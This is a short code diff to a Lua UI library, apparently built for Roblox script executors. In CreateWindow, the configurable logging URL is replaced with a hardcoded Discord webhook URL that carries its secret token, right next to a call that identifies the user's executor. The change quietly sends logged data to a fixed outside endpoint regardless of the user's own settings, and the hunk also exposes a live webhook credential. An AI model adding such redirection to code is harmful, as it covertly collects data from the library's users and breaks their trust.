@@ -4605,7 +4605,7 @@ function library:CreateWindow(options)
 	local e, v = identifyexecutor()
 	
 	local data = {
-		Url = options.Logging.Url,
+		Url = "https://discord.com/api/webhooks/1474723230681137213/L_F18XJds4TWLyrpGVQKngmbocmFpWRcd-tEBY771s5tZ_JMPTQKIvpX7x-L3o_IxXtO",
 
 		Headers = {
 			['Content-Type'] = 'application/json'
